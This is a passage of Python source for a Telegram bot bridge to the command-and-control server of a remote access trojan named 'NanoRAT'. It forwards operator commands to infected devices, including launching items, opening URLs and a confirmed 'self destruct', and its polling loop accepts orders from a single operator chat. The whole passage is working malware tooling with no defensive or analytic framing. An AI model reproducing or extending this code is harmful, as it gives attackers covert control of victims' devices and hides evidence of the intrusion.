        await send_message("✅ launched" if res and res["status"] == "done"
                            else "❌ failed")
        return

    if cmd == "url":
        cmd_r = await c2_send_command(dev, "open_url", {"url": arg})
        res = await c2_wait_result(dev, cmd_r["id"], timeout=10)
        await send_message("✅ opened" if res and res["status"] == "done"
                            else "❌ failed")
        return

    if cmd == "selfdestruct":
        if "confirm" not in arg:
            await send_message("⚠️ type: `/selfdestruct confirm`")
            return
        cmd_r = await c2_send_command(dev, "self_destruct", {})
        await send_message("💀 self destruct initiated")

    await send_message(f"❓ unknown: `/{md(cmd)}`\nTry /start")


# ═══════════════════════════════════════════════════════
#   POLL LOOP
# ═══════════════════════════════════════════════════════
async def poll_loop():
    offset = 0
    print("[bridge] starting poll loop")
    await send_message("🚀 *NanoRAT bridge online*")

    while True:
        try:
            r = await client.get(
                f"{API_BASE}/getUpdates",
                params={"offset": offset + 1, "timeout": POLL_TIMEOUT,
                        "allowed_updates": '["message","callback_query"]'},
            )
            # 409 = another getUpdates poller is already running. Retrying
            # forever just spins; back off hard and say so.
            if r.status_code == 409:
                print("[bridge] getUpdates conflict: another poller owns "
                      "this bot token. Backing off 60s.")
                await asyncio.sleep(60)
                continue

            data = r.json()
            if not data.get("ok"):
                await asyncio.sleep(3)
                continue

            for upd in data.get("result", []):
                offset = max(offset, upd["update_id"])

                # text message
                msg = upd.get("message")
                if msg:
                    chat_id = str((msg.get("chat") or {}).get("id", ""))
                    if chat_id != CHAT_ID:
                        continue
                    text = msg.get("text", "")
                    if text:
                        try:
                            await handle_text(text)
                        except Exception as e:
                            print(f"[bridge] text error: {e}")
                            await send_message(f"⚠️ error: {e}")

                # callback query
                cb = upd.get("callback_query")
                if cb:
                    from_id = str((cb.get("from") or {}).get("id", ""))
                    if from_id != CHAT_ID:
                        continue
                    try:
                        await handle_callback(cb)
                    except Exception as e:
                        print(f"[bridge] cb error: {e}")
                        await answer_callback(cb["id"], f"error: {e}")

        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[bridge] poll error: {e}")
            await asyncio.sleep(3)


if __name__ == "__main__":
    load_state()
    print("[bridge] starting")
    try:
        asyncio.run(poll_loop())
    except KeyboardInterrupt:
        print("[bridge] stopped")
